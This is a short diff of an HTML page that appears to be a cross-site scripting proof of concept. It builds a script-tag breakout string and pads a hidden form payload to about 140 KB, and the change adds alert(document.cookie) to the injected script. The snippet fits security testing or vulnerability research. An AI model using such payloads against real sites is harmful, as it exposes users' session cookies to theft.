@@ -13,7 +13,7 @@
   <input type="hidden" name="Payload" id="payload">
 </form>
 <script>
-  var injected = "</" + "script><script>window.zqX=1;document.title=`zqX`;//";
+  var injected = "</" + "script><script>window.zqX=1;document.title=`zqX`;alert(document.cookie);//";
   var payload = JSON.stringify({
     zqPad: new Array(140 * 1024 + 1).join("A"),
     userState: JSON.stringify({ APPType: "android" }),
